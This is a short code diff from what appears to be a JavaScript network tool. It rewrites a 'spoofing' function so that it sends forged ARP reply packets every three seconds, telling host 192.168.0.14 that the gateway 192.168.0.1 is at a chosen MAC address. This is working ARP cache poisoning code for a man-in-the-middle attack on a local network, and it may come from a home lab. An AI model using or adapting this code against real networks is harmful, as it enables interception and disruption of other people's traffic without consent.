@@ -40,7 +40,15 @@ function subNet() {
 }
 
 function spoofing() {
-  arp.poison('192.168.0.14','192.168.0.1');
+  //arp.poison('192.168.0.14','192.168.0.1');
+  arp.setInterface('en1')
+  arp.send({
+    'op': 'reply',
+    'src_ip': '192.168.0.1',
+    'dst_ip': '192.168.0.14',
+    'src_mac': '90:27:e4:f6:12:4b',
+    'dst_mac': '98:2c:bc:70:7c:6d'
+    })
 }
 
 //Primera ejecución inmediata
@@ -55,5 +63,5 @@ setInterval(localInter, repLocal);
 let repSubNet = 300000; //5 min
 setInterval(subNet, repSubNet);
 
-let repSpoof = 3000; //5 min
+let repSpoof = 3000; //3 seg
 setInterval(spoofing, repSpoof);
